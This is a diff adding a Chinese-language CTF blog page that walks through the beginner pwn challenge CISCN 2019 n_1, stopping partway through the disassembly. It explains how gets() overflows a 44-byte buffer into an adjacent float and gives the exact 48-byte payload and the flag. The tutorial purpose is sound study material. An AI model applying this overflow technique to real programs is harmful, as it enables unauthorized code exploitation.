@@ -1,0 +1,1040 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证 | Quellisya's Blog</title><meta name="author" content="Quellisya"><meta name="copyright" content="Quellisya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f3fbf8"><meta name="description" content="从 file &#x2F; checksec 到 IDA 伪代码，讲清楚这题为什么不打返回地址而是改写相邻的 float v2：44 字节偏移怎么算、11.28125 为什么在内存里是 00 80 34 41、struct.pack(&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证">
+<meta property="og:url" content="https://quellisya.github.io/2026/11/06/pwn-ctf-ciscn-2019-n-1/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="从 file &#x2F; checksec 到 IDA 伪代码，讲清楚这题为什么不打返回地址而是改写相邻的 float v2：44 字节偏移怎么算、11.28125 为什么在内存里是 00 80 34 41、struct.pack(&#39;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/img/avatar-seal.svg">
+<meta property="article:published_time" content="2026-11-06T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-06T02:00:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="CISCN2019">
+<meta property="article:tag" content="IEEE754">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="gdb">
+<meta property="article:tag" content="gets">
+<meta property="article:tag" content="pwndbg">
+<meta property="article:tag" content="pwntools">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="浮点数">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/img/avatar-seal.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证",
+  "url": "https://quellisya.github.io/2026/11/06/pwn-ctf-ciscn-2019-n-1/",
+  "image": "https://quellisya.github.io/img/avatar-seal.svg",
+  "datePublished": "2026-11-06T02:00:00.000Z",
+  "dateModified": "2026-11-06T02:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Quellisya",
+      "url": "https://github.com/Quellisya"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo-seal.svg"><link rel="canonical" href="https://quellisya.github.io/2026/11/06/pwn-ctf-ciscn-2019-n-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0f1f22')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f3fbf8')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/butterfly-custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-ink-tech.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">80</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/banner-ink-tech.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo-seal.svg" alt="Logo"><span class="site-name">Quellisya's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-06T02:00:00.000Z" title="发表于 2026-11-06 10:00:00">2026-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-06T02:00:00.000Z" title="更新于 2026-11-06 10:00:00">2026-11-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fas fa-layer-group"></i>
+    <span class="series-nav__name">系列：Pwn 入门</span>
+    <span class="series-nav__count">第 3 / 3 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;11&#x2F;02&#x2F;pwn-ctf-rip&#x2F;">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;05&#x2F;pwn-ctf-warmup-csaw-2016&#x2F;">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;11&#x2F;06&#x2F;pwn-ctf-ciscn-2019-n-1&#x2F;">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;11&#x2F;05&#x2F;pwn-ctf-warmup-csaw-2016&#x2F;"><i class="fas fa-arrow-left"></i>Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</a></div>
+</nav><div class="note primary flat"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门（做完 <a href="/2026/11/02/pwn-ctf-rip/">rip</a> 和 <a href="/2026/11/05/pwn-ctf-warmup-csaw-2016/">warmup</a> 之后，这题正好练调试）</li>
+<li><strong>考点</strong>：<code>gets</code> 栈溢出、覆盖相邻局部变量、IEEE 754 浮点数、<code>struct.pack</code>、用 <code>gdb.debug</code> 验证 payload</li>
+<li><strong>工具</strong>：<code>file</code>、<code>checksec</code>、IDA、gdb + pwndbg、pwntools</li>
+<li><strong>漏洞点</strong>：<code>gets(v1)</code>，<code>v1</code> 在 <code>rbp-0x30</code></li>
+<li><strong>目标变量</strong>：<code>float v2</code> 在 <code>rbp-0x4</code>，距离 <code>v1</code> 起点 <code>0x2c</code> &#x3D; <code>44</code></li>
+<li><strong>payload</strong>：<code>44</code> 个 <code>A</code> + <code>struct.pack(&#39;&lt;f&#39;, 11.28125)</code>，一共 <code>48</code> 字节</li>
+<li><strong>关键值</strong>：<code>11.28125</code> → <code>0x41348000</code> → 小端字节 <code>00 80 34 41</code></li>
+<li><strong>flag</strong>：<code>CTF2{37d9a42f-2f01-48ad-841c-9144b9ed20a7}</code></li>
+</ul>
+</div>
+
+<div class="note info flat"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（前两篇都讲过）</li>
+<li><strong>环境</strong>：Linux（Kali &#x2F; Ubuntu），IDA、gdb + pwndbg、pwntools</li>
+<li><strong>靶场</strong>：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境</li>
+<li>本文所有操作仅用于<strong>授权靶场和教学</strong>，请勿对未授权的目标做任何测试</li>
+</ul>
+</div>
+
+<div class="note default flat"><p><strong>做题路线</strong></p>
+<p><code>file 看类型</code> → <code>checksec 看保护</code> → <code>IDA 看 main / func</code> → <code>对着汇编确认变量位置</code> → <code>算偏移</code> → <code>算浮点数的字节</code> → <code>写 exp</code> → <code>gdb 验证 payload</code> → <code>打远程拿 flag</code></p>
+</div>
+
+<h2 id="先从-file-和-checksec-开始"><a href="#先从-file-和-checksec-开始" class="headerlink" title="先从 file 和 checksec 开始"></a>先从 file 和 checksec 开始</h2><p>这道题会让你更深入地理解 gdb 调试：你会明白怎么<strong>测试自己的 payload 是否正常运作</strong>，以及 payload 不按预期走的时候，怎么用调试把问题找出来。</p>
+<p>首先还是先用 <code>file</code> 和 <code>checksec</code> 查看文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-1.png" alt="file 查看文件类型"></p>
+<p><em>图 1：<code>file</code> 的输出，注意最后是 <code>not stripped</code></em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,</span><br><span class="line">interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,</span><br><span class="line">BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>这题<strong>没有 stripped</strong>，是一个可执行文件。别看这一行只差了几个字母，它直接改变了我们的调试体验：</p>
+<table>
+<thead>
+<tr>
+<th>输出</th>
+<th>这题</th>
+<th>对调试的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ELF 64-bit LSB</code></td>
+<td>64 位小端</td>
+<td>地址 8 字节，后面用 <code>p64</code> &#x2F; <code>struct.pack</code></td>
+</tr>
+<tr>
+<td><code>dynamically linked</code></td>
+<td>动态链接</td>
+<td>运行时加载 libc，函数经过 PLT</td>
+</tr>
+<tr>
+<td><code>not stripped</code></td>
+<td><strong>符号表还在</strong></td>
+<td>gdb 里可以直接 <code>disas func</code>、<code>b func</code>，不用像上一题那样先找地址</td>
+</tr>
+<tr>
+<td><code>for GNU/Linux 2.6.32</code></td>
+<td>老内核</td>
+<td>老题常见的历史痕迹，不影响做题</td>
+</tr>
+</tbody></table>
+<p>上一题 warmup 是 <code>stripped</code>，<code>main</code> 的名字被删掉了，我们得先从 IDA 拿地址再反汇编。这题符号表完整，gdb 里敲 <code>disas func</code> 就能直接看到汇编，省了一步。</p>
+<p>再看保护：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=pwn3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-2.png" alt="checksec 查看保护"></p>
+<p><em>图 2：<code>checksec</code> 的输出</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/kali/ctf/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stripped: No</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>本例</th>
+<th>一句话解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Arch</code></td>
+<td><code>amd64-64-little</code></td>
+<td>64 位小端序</td>
+</tr>
+<tr>
+<td><code>RELRO</code></td>
+<td><code>Partial RELRO</code></td>
+<td>GOT 只读了一部分，这题用不上</td>
+</tr>
+<tr>
+<td><code>Stack</code></td>
+<td><code>No canary found</code></td>
+<td>没有金丝雀，溢出可以一路往下写</td>
+</tr>
+<tr>
+<td><code>NX</code></td>
+<td><code>NX enabled</code></td>
+<td>栈不可执行，不能往栈上写 shellcode 再跳过去</td>
+</tr>
+<tr>
+<td><code>PIE</code></td>
+<td><code>No PIE (0x400000)</code></td>
+<td>程序基址固定，地址可以写死</td>
+</tr>
+<tr>
+<td><code>Stripped</code></td>
+<td><code>No</code></td>
+<td>符号表还在，gdb 里能直接用函数名</td>
+</tr>
+</tbody></table>
+<p>和上一题相比，这题多了 <code>NX enabled</code>。但它不影响我们：我们的目标是<strong>改写一个已有的局部变量</strong>，然后让程序自己去执行现成的 <code>system(&quot;cat /flag&quot;)</code>，既不执行栈上的代码，也不需要泄露 libc。</p>
+<div class="note success flat"><p><strong>保护机制只决定路线，不决定能不能做。</strong> 没有 canary、没有 PIE，意味着我们可以放心地往栈上写；NX 开着也没关系，因为我们从头到尾都在“借用”程序自己的代码。真正要注意的是：这题的溢出目标不是返回地址，而是一个 <code>float</code> 变量。</p>
+</div>
+
+<h2 id="丢进-IDA-看函数"><a href="#丢进-IDA-看函数" class="headerlink" title="丢进 IDA 看函数"></a>丢进 IDA 看函数</h2><p>依旧先丢到 IDA 里，看看有哪些函数。左侧函数窗口里有 <code>main</code> 和 <code>func</code>，<code>main</code> 只做了一件事——调用 <code>func</code>：</p>
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-3.png" alt="main 的伪代码"></p>
+<p><em>图 3：<code>main</code> 里调用 <code>func()</code></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两行 <code>setvbuf</code> 是 CTF 题的标配：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>stream</code></td>
+<td><code>_bss_start</code> &#x2F; <code>stdin</code></td>
+<td>要设置缓冲的流（stdout &#x2F; stdin）</td>
+</tr>
+<tr>
+<td><code>buf</code></td>
+<td><code>0</code></td>
+<td>让库自己分配缓冲区</td>
+</tr>
+<tr>
+<td><code>mode</code></td>
+<td><code>2</code></td>
+<td><code>_IONBF</code>，即<strong>不使用缓冲</strong></td>
+</tr>
+<tr>
+<td><code>size</code></td>
+<td><code>0</code></td>
+<td>无缓冲模式下忽略</td>
+</tr>
+</tbody></table>
+<p>改成无缓冲之后，<code>puts</code> 的输出会立刻发出去，<code>gets</code> 也会立刻从连接里读，不会因为缓冲区没满而卡住。远程交互时这一点很重要，不然你会觉得“程序怎么没反应”。</p>
+<p>真正的题目在 <code>func</code> 里：</p>
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-4.png" alt="func 的伪代码"></p>
+<p><em>图 4：<code>func</code> 里有 <code>cat /flag</code>，但要 <code>v2 == 11.28125</code> 才肯执行</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">44</span>];   <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2;       <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的信息量很大，一行一行看：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+<th>对做题的意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>_BYTE v1[44];</code></td>
+<td>44 字节的字符数组，在 <code>rbp-0x30</code></td>
+<td><code>gets</code> 的写入起点</td>
+</tr>
+<tr>
+<td><code>float v2;</code></td>
+<td>4 字节浮点数，在 <code>rbp-0x4</code></td>
+<td><strong>溢出目标</strong></td>
+</tr>
+<tr>
+<td><code>v2 = 0.0;</code></td>
+<td>初始化</td>
+<td>程序原本期望它一直是 0</td>
+</tr>
+<tr>
+<td><code>puts(&quot;...&quot;)</code></td>
+<td>打印提示</td>
+<td>告诉我们该输入了</td>
+</tr>
+<tr>
+<td><code>gets(v1);</code></td>
+<td>读一行，不检查长度</td>
+<td>漏洞点</td>
+</tr>
+<tr>
+<td><code>if (v2 == 11.28125)</code></td>
+<td>比对一个浮点数</td>
+<td>满足就执行 <code>cat /flag</code></td>
+</tr>
+<tr>
+<td><code>system(&quot;cat /flag&quot;)</code></td>
+<td>后门</td>
+<td>目标</td>
+</tr>
+</tbody></table>
+<p><code>gets</code> 会从 <code>v1</code> 开始一直往高地址写，<strong><code>v1</code> 后面紧挨着的就是 <code>v2</code></strong>。也就是说，只要输入超过 44 字节，多出来的部分就会改写 <code>v2</code>。这就是整道题的核心。</p>
+<h3 id="为什么这题不打返回地址"><a href="#为什么这题不打返回地址" class="headerlink" title="为什么这题不打返回地址"></a>为什么这题不打返回地址</h3><p>如果你刚做完 rip 和 warmup，第一反应多半是去找“返回地址在哪、偏移多少”。但这道题根本不用碰返回地址。</p>
+<p>栈溢出不只有“覆盖返回地址”一种用法。<strong>缓冲区之后、程序之后还会读到的任何变量，都可以是溢出目标。</strong> 这题里 <code>v1</code> 和 <code>v2</code> 是相邻的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v1 起点（rbp-0x30）</span><br><span class="line">      ↓</span><br><span class="line">[ v1: 44 字节 ][ v2: 4 字节 ]  ← 正好填满 0x30 的栈帧</span><br><span class="line">                ↑</span><br><span class="line">          rbp-0x4，gets 多写 4 字节就到这里</span><br></pre></td></tr></table></figure>
+
+<p>编译器本来可能在两个局部变量之间插填充字节（对齐用），但这里 <code>44 + 4 = 48 = 0x30</code>，正好把 <code>sub rsp, 0x30</code> 腾出来的空间占满，一个字节的缝隙都没有。题目就是照着“从 <code>v1</code> 一路写到 <code>v2</code>”设计的。</p>
+<p>所以我们的 payload 结构是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 44 个 A：填满 v1 ][ 4 字节：v2 想要的浮点数 ]</span><br></pre></td></tr></table></figure>
+
+<p>不用算保存的 rbp，不用算返回地址，也不用管栈对齐——因为程序根本没走到 <code>ret</code>，<code>if</code> 判断一成立就直接调 <code>system</code> 了。</p>
+<div class="note warning flat"><p><strong>每道题的目标不一样。</strong> rip 和 warmup 要改的是<strong>返回地址</strong>（在 <code>rbp+8</code>），这题要改的是<strong>局部变量</strong>（在 <code>rbp-0x4</code>）。看到 <code>gets</code> 先别条件反射地算到 <code>rbp+8</code>，先看看伪代码里“谁会被用来做判断”。</p>
+</div>
+
+<h2 id="对着汇编再看一遍"><a href="#对着汇编再看一遍" class="headerlink" title="对着汇编再看一遍"></a>对着汇编再看一遍</h2><p>先看看 <code>func</code> 的汇编：</p>
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-5.png" alt="func 的汇编"></p>
+<p><em>图 5：<code>disas func</code> 的输出</em></p>
+<p>因为程序没有 stripped，gdb 里直接敲：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disas func</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0x400676 &lt;+0&gt;:   push rbp</span><br><span class="line">0x400677 &lt;+1&gt;:   mov  rbp, rsp</span><br><span class="line">0x40067a &lt;+4&gt;:   sub  rsp, 0x30</span><br><span class="line">0x40067e &lt;+8&gt;:   pxor xmm0, xmm0</span><br><span class="line">0x400682 &lt;+12&gt;:  movss DWORD PTR [rbp-0x4], xmm0</span><br><span class="line">0x400687 &lt;+17&gt;:  mov  edi, 0x4007b4          ; &quot;Let&#x27;s guess the number.&quot;</span><br><span class="line">0x40068c &lt;+22&gt;:  call 0x400520 &lt;puts@plt&gt;</span><br><span class="line">0x400691 &lt;+27&gt;:  lea  rax, [rbp-0x30]</span><br><span class="line">0x400695 &lt;+31&gt;:  mov  rdi, rax</span><br><span class="line">0x400698 &lt;+34&gt;:  mov  eax, 0</span><br><span class="line">0x40069d &lt;+39&gt;:  call 0x400550 &lt;gets@plt&gt;</span><br><span class="line">0x4006a2 &lt;+44&gt;:  movss xmm0, DWORD PTR [rbp-0x4]</span><br><span class="line">0x4006a7 &lt;+49&gt;:  ucomiss xmm0, DWORD PTR [rip+0x146]   ; 0x4007f4 = 11.28125f</span><br><span class="line">0x4006ae &lt;+56&gt;:  jp   0x4006cf &lt;func+89&gt;</span><br><span class="line">0x4006b0 &lt;+58&gt;:  movss xmm0, DWORD PTR [rbp-0x4]</span><br><span class="line">0x4006b5 &lt;+63&gt;:  ucomiss xmm0, DWORD PTR [rip+0x138]   ; 0x4007f4</span><br><span class="line">0x4006bc &lt;+70&gt;:  jne  0x4006cf &lt;func+89&gt;</span><br><span class="line">0x4006be &lt;+72&gt;:  mov  edi, 0x4007cc          ; &quot;cat 